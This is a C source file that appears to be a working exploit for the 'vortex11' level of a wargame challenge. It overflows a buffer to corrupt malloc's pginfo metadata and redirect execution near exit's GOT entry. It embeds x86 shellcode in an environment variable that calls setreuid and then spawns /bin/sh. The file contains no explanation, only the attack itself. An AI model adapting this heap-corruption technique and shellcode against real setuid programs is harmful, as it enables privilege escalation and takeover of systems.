#include <unistd.h>
#include <string.h>


#define PAGE_FILL_SIZE 0x800
#define PGINFO_FILL_SIZE 0x20
#define PG_INFO_NEXT_TO_PAGE 0x10
#define DWORD 0x8


//To get the type in gdb...
typedef struct pginfo {
    struct pginfo  *next;  /* next on the free list */
    void           *page;  /* Pointer to the page */
    unsigned short size;   /* size of this page's chunks */
    unsigned short shift;  /* How far to shift for this size chunks */
    unsigned short free;   /* How many free chunks */
    unsigned short total;  /* How many chunk */
    unsigned int   bits[1]; /* Which chunks are free */
} pginfo_t;


int main(void) {
  struct pginfo unused;
  //0x804d028 - exit@got
  //0x804cfe8 - to overwrite exit
  char new_pginfo_next_page[DWORD*2] = "\x90\x90\x90\x90\xe8\xcf\x04\x08";
  char overwrite_pginfo[PAGE_FILL_SIZE+PGINFO_FILL_SIZE+PG_INFO_NEXT_TO_PAGE+1] = "";
  memset(overwrite_pginfo, 'i', PAGE_FILL_SIZE);
  memcpy(overwrite_pginfo+PAGE_FILL_SIZE, new_pginfo_next_page, PG_INFO_NEXT_TO_PAGE);
  //memset(overwrite_pginfo+PAGE_FILL_SIZE+PG_INFO_NEXT_TO_PAGE-8, '\xff', PGINFO_FILL_SIZE);

	char *argv[4] = {"./vortex11", overwrite_pginfo, "\xb3\xdf\xff\xff", 0};
	char *env[2] = {"SHELLCODE=1\xc0\xb0\x46""1\xdb""f\xbb\xe8\x03""1\xc9""f\xb9\xe8\x03\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};
	execve("./vortex11", argv, env);
}
